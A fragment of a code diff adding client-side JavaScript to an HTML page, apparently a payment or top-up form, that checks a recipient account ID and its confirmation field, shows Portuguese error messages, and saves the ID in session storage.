+        if (!validateIdShape(a)) {
+          e.preventDefault(); e.stopImmediatePropagation();
+          showIdError('Informe o ID da conta que vai receber (6 a 20 dígitos).');
+          idInput.focus();
+          return;
+        }
+        if (idConfirmWrap.style.display === 'none' || !b) {
+          e.preventDefault(); e.stopImmediatePropagation();
+          checkConfirmNeeded();
+          showIdError('Confirme o ID digitando-o novamente.');
+          idConfirm && idConfirm.focus();
+          return;
+        }
+        if (a !== b) {
+          e.preventDefault(); e.stopImmediatePropagation();
+          showIdError('Os IDs não conferem. Digite o mesmo ID nos dois campos.');
+          idConfirm.focus();
+          return;
+        }
+        hideIdError();
+        try { sessionStorage.setItem(PLAYER_ID_KEY, a); } catch {}
+      }, true);
+    }
+  });
+</script>
+</body>
+</html>
